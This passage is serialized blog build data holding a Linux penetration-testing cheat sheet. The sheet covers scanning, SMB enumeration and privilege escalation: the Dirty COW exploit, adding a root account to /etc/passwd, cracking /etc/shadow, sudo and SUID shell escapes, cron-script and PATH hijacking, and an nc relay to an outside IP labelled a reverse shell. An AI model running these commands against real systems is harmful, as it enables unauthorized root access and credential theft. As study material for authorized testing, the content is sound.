--interactive\n!sh\nwhoami\n```\n### Environment variable hijacking\nFind command with suid just as 4.1.7.\nSuppose it is `su`\n```\nvim /tmp/su         //write shellcode into su\nexport PATH=/tmp:$PATH\n```\n### Administrator configuration error\nConfiguring a program with SUID that does not have the setuid(0) code, such as `find `mentioned above.\n```\nmkdir abc\nfind abc -exec &#39;/bin/sh&#39; \\;\n```\n### Docker group\n### Service vulnerability\n```\nnetstat -antup\n```\nRedis reverse shell.\n```\nnc -l 12345 | nc 102.168.191.170 80\n```\n## Windows\n***\n# 5 Domain penetration&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Mandatory manual.md&quot;],&quot;digest&quot;:[0,&quot;6d2eb50a4cca332f&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;port-scan\&quot;&gt;Port scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#port-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;web-scan\&quot;&gt;Web scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#web-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto  -port 80 -host 192.168.124.44 -o nikto-result.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;vulnerability-analysis\&quot;&gt;Vulnerability analysis&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#vulnerability-analysis\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Use nc to view banner.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv 192.168.124.44 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -m 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;exploitation\&quot;&gt;Exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploitation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;smb\&quot;&gt;smb&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#smb\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux 192.168.124.40&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;smbclient -L 192.168.124.40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;linux\&quot;&gt;Linux&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#linux\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;kernel-stack-overflow\&quot;&gt;Kernel stack overflow&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kernel-stack-overflow\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/*-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit linux 3.10 CentOS Linux 7&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;use tools&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./linux-exploit-suggester-2.pl&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Take the rights of dirty-cow as an example&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -pthread dirty.c -lcrypt -o dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod +x dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./dirty fly&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;plain-password-of-root\&quot;&gt;Plain password of root&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#plain-password-of-root\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;If /etc/passwd can be write by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl passwd -1 -salt hacker 123456&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;generate &lt;code&gt;$1$hacker$4o50Z4aoUGaLMC0Rg4Io40&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;echo &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then login in user hacker&lt;/p&gt;\n&lt;p&gt;If /etc/shadow can be read by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow /etc/passwd /etc/shadow &gt; shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod 777 shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;password-reuse\&quot;&gt;Password reuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#password-reuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;sudo-abuse\&quot;&gt;Sudo abuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#sudo-abuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;https://gtfobins.github.io/\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;GTFOBins - gtfobins.github.io\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;gtfobins.github.io&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;GTFOBins&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;https://gtfobins.github.io/&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div class=\&quot;bg-muted relative md:w-full shrink-0 aspect-1200/630 h-38\&quot;&gt;&lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;GTFOBins\&quot; class=\&quot;h-full w-full object-cover\&quot; loading=\&quot;lazy\&quot;&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;For example:&lt;code&gt;su,    awk,    man &lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo man man&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo vim -c &#39;:!/bin/sh&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;su-root-prohibited\&quot;&gt;’su root’ prohibited&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#su-root-prohibited\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;scheduled-task\&quot;&gt;Scheduled task&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#scheduled-task\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -l /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/crontab&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;If there is a scheduled task named 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /tmp/1.py    //查看是否有w权限&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Write the code into 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;import os &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;cp /bin/sh /tmp/sh&#39;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;chmod u+s /tmp/sh&#39;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;code&gt;./tmp/sh&lt;/code&gt;&lt;/p&gt;\n&lt;h3 id=\&quot;suid\&quot;&gt;SUID&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#suid\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Take nmap as an example:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;environment-variable-hijacking\&quot;&gt;Environment variable hijacking&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#environment-variable-hijacking\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Find command with suid just as 4.1.7.\nSuppose it is &lt;code&gt;su&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;vim /tmp/su         //write shellcode into su&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;administrator-configuration-error\&quot;&gt;Administrator configuration error&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#administrator-configuration-error\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Configuring a program with SUID that does not have the setuid(0) code, such as &lt;code&gt;find &lt;/code&gt;mentioned above.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;mkdir abc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find abc -exec &#39;/bin/sh&#39; \\;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;docker-group\&quot;&gt;Docker group&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#docker-group\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;service-vulnerability\&quot;&gt;Service vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#service-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antup&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Redis reverse shell.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -l 12345 | nc 102.168.191.170 80&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;windows\&quot;&gt;Windows&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#windows\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;5-domain-penetration\&quot;&gt;5 Domain penetration&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#5-domain-penetration\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;port-scan&quot;],&quot;text&quot;:[0,&quot;Port scan&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;web-scan&quot;],&quot;text&quot;:[0,&quot;Web scan&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;vulnerability-analysis&quot;],&quot;text&quot;:[0,&quot;Vulnerability analysis&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;exploitation&quot;],&quot;text&quot;:[0,&quot;Exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;smb&quot;],&quot;text&quot;:[0,&quot;smb&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;kernel-stack-overflow&quot;],&quot;text&quot;:[0,&quot;Kernel stack overflow&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;plain-password-of-root&quot;],&quot;text&quot;:[0,&quot;Plain password of root&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;password-reuse&quot;],&quot;text&quot;:[0,&quot;Password reuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;sudo-abuse&quot;],&quot;text&quot;:[0,&quot;Sudo abuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;su-root-prohibited&quot;],&quot;text&quot;:[0,&quot;’su root’ prohibited&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;scheduled-task&quot;],&quot;text&quot;:[0,&quot;Scheduled task&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;suid&quot;],&quot;text&quot;:[0,&quot;SUID&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;environment-variable-hijacking&quot;],&quot;text&quot;:[0,&quot;Environment variable hijacking&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;administrator-configuration-error&quot;],&quot;text&quot;:[0,&quot;Administrator configuration error&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;docker-group&quot;],&quot;text&quot;:[0,&quot;Docker group&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;service-vulnerability&quot;],&quot;text&quot;:[0,&quot;Service vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;windows&quot;],&quot;text&quot;:[0,&quot;Windows&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;5-domain-penetration&quot;],&quot;text&quot;:[0,&quot;5 Domain penetration&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2023-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/5&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/信息收集&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;信息收集&quot;],&quot;date&quot;:[3,&quot;2023-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 